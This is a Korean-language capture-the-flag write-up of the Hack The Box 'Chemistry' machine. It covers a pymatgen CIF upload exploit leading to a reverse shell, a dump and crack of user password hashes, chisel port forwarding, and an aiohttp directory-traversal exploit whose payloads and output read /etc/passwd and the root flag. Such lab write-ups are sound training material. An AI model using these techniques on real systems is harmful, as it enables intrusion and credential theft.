---
layout: post
title: Hack The Box - Chemistry
subtitle: Hack the box Chemistry machine writeup
category: writeup
thumbnail-img: /assets/img/writeup/HTB/chemistry/pwned.png
tags: [writeup, hackthebox, chemistry, linux, cif, CVE-2024-23346, CVE-2024-23334, sqlite3]
author: Hong
---
# nmap
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Tue, 11 Mar 2025 11:16:28 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```
웹서버가 있는 것을 발견.
# 웹 enum
사이트 접속 후 리스폰스 헤더로부터 웹서버의 버전을 확인.

혹은 whatweb을 사용해도 된다.

```
whatweb http://10.10.11.38:5000/
http://10.10.11.38:5000/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.9.5], IP[10.10.11.38], Python[3.9.5], Title[Chemistry - Home], Werkzeug[3.0.3]
```

![version](/assets/img/writeup/HTB/chemistry/responseheader.png)

werkzeug 3.0.3인 것과 파이썬 3.9.5인 것을 확인한다.

웹페이지를 둘러보니 로그인과 회원등록 페이지가 있다.

아무거나 입력해서 유저를 만들고 로그인하니 업로드 화면이 나온다.

![upload](/assets/img/writeup/HTB/chemistry/dashboard.png)

여기에 리버스쉘을 업로드하는 방식을 생각했다.

하지만 cif파일만 업로드가 가능하다.

아직 감을 못잡겠다. msfvenom에 cif로 페이로드를 만들 수는 없었다.

python cif parser exploit으로 검색해봤다.

관련 취약점으로 보이는 [사이트](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0)를 발견했다.

여기의 페이로드를 이용해서 리버스쉘을 작성했다.

![payload](/assets/img/writeup/HTB/chemistry/cifpayload.png)

**이번에 안건데 리버스쉘 페이로드를 만들 때 busybox가 가장 안정적이고 잘 통한다고 한다.**

busybox는 대부분의 리눅스에 디폴트로 설치되어있기 때문에 busybox로 쓰는 nc의 경우 항상 -e 옵션을 쓸 수 있다.

![revshell](/assets/img/writeup/HTB/chemistry/reverseshell.png)

# 포스트 익스플로잇
app유저로 로그인에 성공했다.

다른 유저의 정보들이 있는지 확인하기위해 파일들을 살펴본다.

```bash
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] a= 'sqlite:///database.db7
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}
```
결국 사용하지는 않았지만 시크릿키도 확인 할 수 있었다.

home폴더를 보거나 /etc/passwd로 유저를 확인한다.

```bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash            lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false     app:x:1001:1001:,,,:/home/app:/bin/bash 
```
rosa유저를 발견.

/instance 디렉토리에 database.db파일이 있는 것도 발견.

sqlite3으로 데이터베이스를 확인해본다.
```bash
app@chemistry:~/instance$ sqlite3 database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
structure  user
sqlite> select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|123|202cb962ac59075b964b07152d234b70
16|teste|698dc19d489c4e4db73e28a713eab07b
17|test|098f6bcd4621d373cade4e832627b4f6
18|emiliano|fcea920f7412b5da7be0cf42b8c93759 
```
rosa의 비밀번호를 크랙킹하면 *unicorniosrosados*가 나온다.

rosa의 크레덴셜로 ssh 접속한다.
# rosa 시스템 enum
`sudo -l`에 아무것도 사용할 수 없는 것을 확인.

다음으로 현재 사용중인 포트를 확인해봤다.

```bash
rosa@chemistry:~$ netstat -tulnp
Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1592/bashtcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

8080번 포트가 열려있는 것을 확인.

웹사이트에 접속해보기 위해 포트포워딩을 한다.

룹백주소로 되어있기 때문에 포트포워드를 사용.

```bash
# 서버
./chisel_1.10.1_linux_amd64 server -p 6666 --reverse

# 클라이언트
rosa@chemistry:~$ ./chisel_1.10.1_linux_amd64 client 10.10.16.47:6666 R:8080:127.0.0.1:8080
```
# 웹사이트 enum
위와 같이 설정 후 칼리 파이어폭스 프록시 설정하고 127.0.0.1:8080에 접속하면 페이지가 보인다.

![monitoring](/assets/img/writeup/HTB/chemistry/monitoring.png)

인스펙션을 통해 웹서버가 aiohttp 3.9.1인 것을 확인한다.

취약점을 검색해보니 다음과 같은 내용을 확인했다.

[디렉토리 트래버설](https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0)

변수에 넘겨줄 값을 찾기 위해 gobuster를 실행.

```bash
/assets               (Status: 403) [Size: 14]       
```
assets라는 디렉토리가 하나 나왔다.

익스플로잇을 실행해본다.
```bash
python3 exploit.py -u http://127.0.0.1:8080 -f /etc/passwd -d /assets
[+] Attempt 0
Payload: /assets/../etc/passwd
Status code: 404
[+] Attempt 1
Payload: /assets/../../etc/passwd
Status code: 404
[+] Attempt 2
Payload: /assets/../../../etc/passwd
Status code: 200
Respose:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
```

작동한다.

root의 플래그만 알면 되기 때문에 굳이 복잡하게 가지 않고 플래그만 획득한다.
```bash
python3 [exploit.py](http://exploit.py/) -u [http://127.0.0.1:8080](http://127.0.0.1:8080/) -f /root/root.txt -d /assets

[+] Attempt 0

Payload: /assets/../root/root.txt

Status code: 404

[+] Attempt 1

Payload: /assets/../../root/root.txt

Status code: 404

[+] Attempt 2

Payload: /assets/../../../root/root.txt

Status code: 200

Respose:

{FLAG}
```